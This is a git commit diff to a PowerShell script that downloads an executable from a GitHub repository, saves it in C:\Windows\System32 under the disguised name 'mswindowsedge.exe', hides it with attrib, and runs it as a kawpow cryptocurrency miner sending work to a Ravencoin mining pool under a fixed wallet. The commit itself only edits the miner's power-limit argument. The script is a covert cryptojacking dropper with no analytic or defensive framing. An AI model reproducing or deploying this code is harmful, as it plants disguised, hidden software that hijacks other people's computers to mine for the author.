d415971fc49e4c544e413ac2c35ed75b940d697b
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-06-10 00:03:01 +0300

    Update script12GS-02.ps1

--- script12GS-02.ps1
+++ script12GS-02.ps1
@@ -5,5 +5,5 @@ if (Test-Path -Path $Folder) {
     C:\Windows\System32\mswindowsedge.exe -a kawpow -o rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-001 -pl 15%
 } else {
     "Path doesn't exist."
-    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/mswindowsedge.exe" -OutFile mswindowsedge.exe ; attrib +h mswindowsedge.exe; C:\Windows\System32\mswindowsedge.exe  -a kawpow -o rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-001 -pl 15
+    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/mswindowsedge.exe" -OutFile mswindowsedge.exe ; attrib +h mswindowsedge.exe; C:\Windows\System32\mswindowsedge.exe  -a kawpow -o rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-001 -pl 15%
 }
